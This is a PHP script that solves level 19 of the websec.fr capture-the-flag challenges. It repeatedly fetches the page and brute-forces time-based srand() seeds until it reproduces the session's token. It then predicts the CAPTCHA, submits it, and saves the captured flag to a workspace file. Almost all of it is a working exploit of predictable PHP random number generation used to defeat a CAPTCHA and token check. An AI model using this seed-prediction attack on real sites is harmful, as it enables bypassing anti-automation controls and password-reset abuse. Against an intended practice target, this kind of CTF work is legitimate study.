<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║         MASSIVE BRUTEFORCE - ABSOLUTE MODE                 ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$round = 0;
$total_seeds_tested = 0;

while (true) {
    $round++;
    
    // Hacer request
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    $current_time = time();
    
    echo "[Round $round] " . date('H:i:s') . " - Token: " . substr($real_token, 0, 8) . "... | Total tested: $total_seeds_tested\n";
    
    // Probar desde AHORA hacia atrás - asumiendo que el servidor puede estar desincronizado
    // Probar los últimos 4 días completos (en caso de timezone incorrecto o desincronización severa)
    $start_time = $current_time - (4 * 24 * 3600);
    $end_time = $current_time + 3600;
    
    for ($seed = $start_time; $seed <= $end_time; $seed++) {
        srand($seed);
        $test_token = generate_random_text(32);
        $total_seeds_tested++;
        
        if ($test_token === $real_token) {
            $offset = $seed - $current_time;
            echo "\n✓✓✓ MATCH FOUND! ✓✓✓\n";
            echo "Seed: $seed\n";
            echo "Time: " . date('Y-m-d H:i:s', $seed) . "\n";
            echo "Offset from current: $offset seconds (" . ($offset/3600) . " hours)\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n═══════════════════════════════════════════\n";
                echo "    SUCCESS! FLAG CAPTURED!\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    $flag = $flag_match[0];
                    echo "    FLAG: $flag\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag . "\n");
                    echo "═══════════════════════════════════════════\n";
                    exit(0);
                }
            } else {
                echo "Submission failed but seed matched!\n";
            }
            
            break;
        }
        
        if ($total_seeds_tested % 10000 == 0) {
            $progress = (($seed - $start_time) / ($end_time - $start_time)) * 100;
            echo "  Progress: " . number_format($progress, 1) . "% | Seed: $seed (" . date('m-d H:i', $seed) . ")\n";
        }
    }
    
    // Breve pausa antes del siguiente round
    usleep(100000);
}
?>